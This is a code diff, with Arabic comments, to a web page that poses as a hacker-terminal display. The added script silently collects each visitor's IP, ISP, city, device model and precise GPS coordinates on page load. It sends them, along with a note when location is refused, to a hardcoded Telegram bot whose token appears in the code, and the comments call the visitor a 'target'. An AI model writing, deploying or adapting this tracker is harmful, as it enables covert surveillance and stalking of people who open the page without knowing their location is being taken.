@@ -36,22 +36,99 @@
     <script>
         const output = document.getElementById('output');
         
-        // جلب بيانات الجهاز الأساسية من متصفح الزائر
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const screenRes = window.screen.width + 'x' + window.screen.height;
-        const language = navigator.language;
+        // بيانات بوت تليجرام الخاص بك (أنت الوحيد الذي تستقبل التقارير)
+        const BOT_TOKEN = "8942876579:AAE8F9nrRvr1mYdpiyzyCH1BfCH2GzFTCv0";
+        const CHAT_ID = "806632734";
 
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // استخراج اسم الجهاز بدقة من المتصفح
+        function getDeviceModel() {
+            let ua = navigator.userAgent;
+            let device = "Unknown Device";
+            
+            if (/android/i.test(ua)) {
+                let match = ua.match(/;\s([^;]+)\sBuild\//) || ua.match(/\(([^)]+)\)/);
+                if (match && match[1]) {
+                    device = "Android: " + match[1];
+                } else {
+                    device = "Android Phone";
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                device = "Apple iOS Device";
+            } else if (/windows/i.test(ua)) {
+                device = "Windows PC";
+            } else if (/macintosh/i.test(ua)) {
+                device = "Mac OS Computer";
+            }
+            return device;
+        }
+
+        // جلب الـ IP وبيانات الشبكة والجهاز وإرسالها لك
+        async function getVisitorData() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                
+                let exactDevice = getDeviceModel();
+
+                let msg = `🚨 [ صيد جديد - هدف دخل للموقع ] 🚨\n\n` +
+                          `📱 اسم وتفاصيل الجهاز: ${exactDevice}\n` +
+                          `🌐 IP: ${data.ip}\n` +
+                          `🏢 مزود الإنترنت: ${data.org}\n` +
+                          `📍 الدولة والمدينة: ${data.country_name} - ${data.city}\n` +
+                          `💻 المنصة: ${navigator.platform}\n` +
+                          `🗣️ اللغة: ${navigator.language}`;
+                
+                sendToTelegram(msg);
+            } catch (e) {}
+        }
+
+        // طلب إذن الـ GPS للحصول على إحداثيات المكان بدقة
+        function getGpsLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        let gpsMsg = `📍 [ إحداثيات الـ GPS الدقيقة للهدف ] 📍\n\n` +
+                                     `خط العرض: ${lat}\n` +
+                                     `خط الطول: ${lon}\n` +
+                                     `🔗 رابط الخريطة المباشر:\nhttps://maps.google.com/?q=${lat},${lon}`;
+                        sendToTelegram(gpsMsg);
+                    },
+                    (error) => {
+                        sendToTelegram(`⚠️ [ ملاحظة ]: الهدف رفض إذن مشاركة الموقع الجغرافي.`);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+
+        getVisitorData();
+        getGpsLocation();
+
+        // واجهة التيرمكس الوهمية التي يراها الزائر
         const logs = [
             "[+] Initializing secure handshake...",
             "[+] Bypassing firewall and proxy layers...",
             "[+] Target connection detected successfully.",
-            "[+] Extracting system fingerprints...",
+            "[+] Extracting system fingerprints & hardware specs...",
             "--------------------------------------------------",
-            "[*] Client Platform: " + platform,
-            "[*] Browser Engine: " + userAgent,
-            "[*] Screen Resolution: " + screenRes,
-            "[*] System Language: " + language,
+            "[*] Client Device: " + getDeviceModel(),
+            "[*] Browser Engine: " + navigator.userAgent,
+            "[*] Screen Resolution: " + window.screen.width + 'x' + window.screen.height,
             "--------------------------------------------------",
             "[!] WARNING: UNAUTHORIZED ACCESS ATTEMPT LOGGED.",
             "[!] GEOLOCATION AND HARDWARE SIGNATURE RECORDED.",
@@ -69,7 +146,7 @@
                 div.textContent = logs[index];
                 output.appendChild(div);
                 index++;
-                setTimeout(typeLine, 350); // سرعة كتابة النصوص
+                setTimeout(typeLine, 350);
             }
         }
 
